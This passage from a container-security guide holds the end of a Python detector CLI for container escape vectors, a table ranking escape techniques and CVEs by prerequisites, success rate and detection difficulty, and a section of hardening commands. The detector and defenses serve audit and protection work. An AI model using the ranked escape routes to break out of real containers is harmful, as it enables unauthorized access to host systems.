+        print(f"Detected vulnerabilities/risks ({len(detected)} items)")
+        print(f"{'='*70}")
+        for f in detected:
+            if only_detected and f.severity == "INFO":
+                continue
+            color_prefix = {
+                "CRITICAL": "[CRITICAL]",
+                "HIGH":     "[HIGH    ]",
+                "MEDIUM":   "[MEDIUM  ]",
+                "LOW":      "[LOW     ]",
+                "INFO":     "[INFO    ]",
+            }.get(f.severity, "[UNKNOWN ]")
+
+            print(f"\n{color_prefix} {f.name}")
+            print(f"  Category : {f.category}")
+            print(f"  Desc     : {f.description}")
+            if f.evidence:
+                print(f"  Evidence : {f.evidence[:120]}")
+            if f.exploit_hint:
+                print(f"  Exploit  : {f.exploit_hint[:120]}")
+
+    if not only_detected and not_detected:
+        print(f"\n{'─'*70}")
+        print(f"Normal items ({len(not_detected)} items)")
+        for f in not_detected:
+            if f.severity != "INFO":
+                continue
+            print(f"  [OK] {f.name}")
+
+    # Summary
+    critical = sum(1 for f in detected if f.severity == "CRITICAL")
+    high = sum(1 for f in detected if f.severity == "HIGH")
+    medium = sum(1 for f in detected if f.severity == "MEDIUM")
+    print(f"\n{'='*70}")
+    print(f"[Summary] {len(findings)} checks total | "
+          f"CRITICAL:{critical} HIGH:{high} MEDIUM:{medium} | "
+          f"Escape likelihood: {'High' if critical > 0 else 'Medium' if high > 0 else 'Low'}")
+
+
+# ── CLI command handlers ──────────────────────────────────────────────────────
+
+def cmd_check_all(args: argparse.Namespace) -> None:
+    print("[*] Starting comprehensive container escape vector detection...\n")
+    findings = run_all_checks(verbose=args.verbose)
+    print_findings(findings, only_detected=args.only_detected)
+    if args.output:
+        data = [asdict(f) for f in findings]
+        Path(args.output).write_text(json.dumps(data, indent=2, ensure_ascii=False))
+        print(f"\n[+] Results saved: {args.output}")
+
+
+def cmd_check_caps(args: argparse.Namespace) -> None:
+    print("[*] Capability check\n")
+    caps = get_process_capabilities()
+    cap_eff = caps.get("CapEff", 0)
+    cap_prm = caps.get("CapPrm", 0)
+
+    decoded = decode_capabilities(cap_eff)
+    print(f"CapEff: {cap_eff:#018x}")
+    print(f"CapPrm: {cap_prm:#018x}\n")
+
+    if not decoded:
+        print("[+] No effective capabilities")
+        return
+
+    for cap in sorted(decoded, key=lambda c: c.severity):
+        print(f"  [{cap.severity:8s}] {cap.cap_name:30s} - {cap.description}")
+
+
+def cmd_check_namespaces(args: argparse.Namespace) -> None:
+    print("[*] Namespace isolation check\n")
+    findings = check_namespaces()
+    print_findings(findings, only_detected=False)
+
+
+def cmd_check_cgroups(args: argparse.Namespace) -> None:
+    print("[*] cgroup security check\n")
+    findings = check_cgroups()
+    print_findings(findings, only_detected=False)
+
+
+def cmd_check_mounts(args: argparse.Namespace) -> None:
+    print("[*] Mount point security check\n")
+    findings = check_mounts()
+    print_findings(findings, only_detected=False)
+
+
+def cmd_check_kernel(args: argparse.Namespace) -> None:
+    print("[*] Kernel vulnerability check\n")
+    findings = check_kernel_version()
+    print_findings(findings, only_detected=False)
+
+
+def cmd_report(args: argparse.Namespace) -> None:
+    """Generate full report"""
+    print("[*] Generating full security report...\n")
+    findings = run_all_checks(verbose=True)
+
+    report = {
+        "system": {
+            "hostname": socket.gethostname(),
+            "kernel": platform.release(),
+            "arch": platform.machine(),
+            "pid": os.getpid(),
+        },
+        "summary": {
+            "total_checks": len(findings),
+            "critical": sum(1 for f in findings if f.detected and f.severity == "CRITICAL"),
+            "high": sum(1 for f in findings if f.detected and f.severity == "HIGH"),
+            "medium": sum(1 for f in findings if f.detected and f.severity == "MEDIUM"),
+            "low": sum(1 for f in findings if f.detected and f.severity == "LOW"),
+        },
+        "findings": [asdict(f) for f in findings],
+    }
+
+    print_findings(findings, only_detected=False)
+
+    output = args.output or "container_escape_report.json"
+    Path(output).write_text(json.dumps(report, indent=2, ensure_ascii=False))
+    print(f"\n[+] Report saved: {output}")
+
+
+# ── argparse ──────────────────────────────────────────────────────────────────
+
+def build_parser() -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(
+        prog="container_escape_detector",
+        description="Automated container escape vulnerability detector",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s check-all
+  %(prog)s check-all --only-detected --output findings.json
+  %(prog)s check-caps
+  %(prog)s check-namespaces
+  %(prog)s check-cgroups
+  %(prog)s check-mounts
+  %(prog)s check-kernel
+  %(prog)s report --output report.json
+        """
+    )
+    sub = parser.add_subparsers(dest="command", required=True)
+
+    # check-all
+    p_all = sub.add_parser("check-all", help="Comprehensive check of all escape vectors")
+    p_all.add_argument("--only-detected", action="store_true", help="Show only detected items")
+    p_all.add_argument("--verbose", action="store_true", help="Verbose output")
+    p_all.add_argument("--output", "-o", help="Output file (JSON)")
+
+    # Individual checks
+    sub.add_parser("check-caps", help="Capability check")
+    sub.add_parser("check-namespaces", help="Namespace isolation check")
+    sub.add_parser("check-cgroups", help="cgroup security check")
+    sub.add_parser("check-mounts", help="Mount point check")
+    sub.add_parser("check-kernel", help="Kernel vulnerability check")
+
+    # report
+    p_rep = sub.add_parser("report", help="Generate full security report")
+    p_rep.add_argument("--output", "-o", default="container_escape_report.json")
+
+    return parser
+
+
+def main() -> None:
+    parser = build_parser()
+    args = parser.parse_args()
+
+    dispatch = {
+        "check-all": cmd_check_all,
+        "check-caps": cmd_check_caps,
+        "check-namespaces": cmd_check_namespaces,
+        "check-cgroups": cmd_check_cgroups,
+        "check-mounts": cmd_check_mounts,
+        "check-kernel": cmd_check_kernel,
+        "report": cmd_report,
+    }
+
+    handler = dispatch.get(args.command)
+    if handler:
+        handler(args)
+    else:
+        parser.print_help()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 9. Escape Technique Comparison Summary
+
+| Technique | Prerequisites | Success Rate | Detection Difficulty |
+|-----------|--------------|--------------|----------------------|
+| Privileged + cgroup release_agent | `--privileged` | Very High | Low |
+| Docker socket mount | docker.sock mounted | Very High | Low |
+| CVE-2019-5736 (runc overwrite) | runc < 1.0-rc7 | High | Medium |
+| CAP_SYS_ADMIN + cgroupv1 | CAP_SYS_ADMIN | High | Medium |
+| CVE-2022-0492 | < 5.17 kernel, cgroupv1 | Medium | High |
+| hostPID + nsenter | `--pid=host` | High | Low |
+| overlayfs CVE-2021-3493 | Ubuntu < 5.11.0-25 | Medium | High |
+| userspace runc race condition | runc execution triggerable | Low | Very High |
+
+---
+
+## 10. Advanced Defenses
+
+```bash
+# 1. Use gVisor (runsc) - intercept syscalls
+docker run --runtime=runsc nginx
+
+# 2. Kata Containers - VM-level isolation
+docker run --runtime=kata nginx
+
+# 3. Create custom Seccomp profile
+cat > /etc/docker/seccomp-strict.json << 'EOF'
+{
+  "defaultAction": "SCMP_ACT_ERRNO",
+  "syscalls": [
+    {"names": ["read","write","open","close","stat","exit","exit_group",
+               "brk","mmap","munmap","access","execve","nanosleep"],
+     "action": "SCMP_ACT_ALLOW"}
+  ]
+}
+EOF
+docker run --security-opt seccomp=/etc/docker/seccomp-strict.json nginx
+
+# 4. Apply AppArmor profile
+aa-genprof /usr/bin/myapp
+docker run --security-opt apparmor=myapp-profile nginx
+
+# 5. Switch to cgroupv2 (eliminates release_agent vulnerability)
+# /etc/default/grub: GRUB_CMDLINE_LINUX="systemd.unified_cgroup_hierarchy=1"
+update-grub && reboot
+
+# 6. Read-only root + tmpfs combination
 docker run \
   --read-only \
   --tmpfs /tmp:rw,noexec,nosuid \
